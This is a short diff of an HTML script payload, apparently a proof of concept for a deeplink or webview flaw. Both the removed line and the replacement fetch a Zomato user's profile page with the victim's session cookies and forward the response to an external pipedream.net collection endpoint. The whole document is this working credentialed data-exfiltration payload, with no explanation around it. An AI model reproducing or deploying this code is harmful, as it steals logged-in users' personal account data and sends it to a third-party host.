@@ -1,3 +1,12 @@
 <script>
-  window.JsBridge.openDeeplink('javascript:fetch("https://www.zomato.com/webroutes/getPage?page_url=/profile",{credentials:"include"}).then(r=>r.text()).then(d=>location.href="https://eomfuajl79ed6za.m.pipedream.net?d="+encodeURIComponent(d))')
+  var xhr = new XMLHttpRequest();
+  xhr.open('GET', 'https://www.zomato.com/webroutes/getPage?page_url=/profile', true);
+  xhr.withCredentials = true;
+  xhr.onload = function() {
+    fetch('https://eomfuajl79ed6za.m.pipedream.net?data=' + encodeURIComponent(xhr.responseText));
+  };
+  xhr.onerror = function(e) {
+    fetch('https://eomfuajl79ed6za.m.pipedream.net?error=xhr_failed');
+  };
+  xhr.send();
 </script>
